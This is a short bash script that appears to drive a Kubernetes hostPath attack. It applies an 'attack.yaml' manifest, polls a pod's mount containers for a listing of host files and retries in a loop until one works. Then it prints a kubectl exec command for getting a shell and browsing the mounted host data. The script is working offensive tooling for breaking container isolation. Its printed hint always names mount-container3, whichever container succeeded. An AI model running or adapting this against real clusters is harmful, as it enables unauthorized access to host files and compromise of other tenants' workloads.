#!/usr/bin/env bash

while [ 1 -lt 2 ]
do
	printf "\033[2m"
	kubectl apply -f attack.yaml;
	kubectl wait --for=condition=Running pod/hostpath4everyone --timeout=40s
	for c in {1..10}; do
		listing=$(kubectl logs hostpath4everyone mount-container$c);
		if [ "$listing" = "" ];
		then
			echo -n "$c‚ùå"
		else
			echo $listing;
			printf "\033[0m"
			echo "run 'kubectl exec -i -t hostpath4everyone -c mount-container3 -- /bin/bash' and then 'ls /mnt/data$c"
			echo 'Success!';
			exit;
		fi
	done
	printf "\033[0m"
	echo -e "\nBad attempts. Delete pod and retry.."
	printf "\033[2m"
	kubectl delete pod hostpath4everyone
	printf "\033[0m"
done